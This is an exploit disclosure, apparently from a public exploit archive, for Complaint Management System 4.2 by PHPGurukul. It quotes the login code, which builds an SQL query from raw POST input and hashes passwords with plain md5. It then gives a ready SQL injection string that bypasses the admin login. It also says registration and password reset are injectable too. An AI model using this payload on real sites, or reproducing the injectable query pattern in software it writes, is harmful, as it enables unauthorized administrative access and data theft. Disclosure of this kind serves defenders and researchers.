@@ -1,0 +1,40 @@
+# Exploit Title: Complaint Management System 4.2 - Authentication Bypass
+# Author: Besim ALTINOK
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/complaint-management-sytem/
+# Version: v4.2
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+------ Details:
+
+1- Vulnerable code is here:
+
+if(isset($_POST['submit']))
+{
+$username=$_POST['username'];
+$password=md5($_POST['password']);
+$ret=mysqli_query($con,"SELECT * FROM admin WHERE
+username='$username' and password='$password'");
+$num=mysqli_fetch_array($ret);
+if($num>0)
+{
+$extra="change-password.php";//
+$_SESSION['alogin']=$_POST['username'];
+$_SESSION['id']=$num['id'];
+$host=$_SERVER['HTTP_HOST'];
+$uri=rtrim(dirname($_SERVER['PHP_SELF']),'/\\');
+header("location:http://$host$uri/$extra");
+exit();
+}
+
+2- We can bypass authentication with SQLi:
+
+Bypass code (admin login panel):
+
+Username: pentester' or'1'=1#
+Password : pentester' or'1'=1#
+
+Finally: There is a lot of SQLi input in this project. Like, login,
+registration, forgot password ...
+-----------------------------------
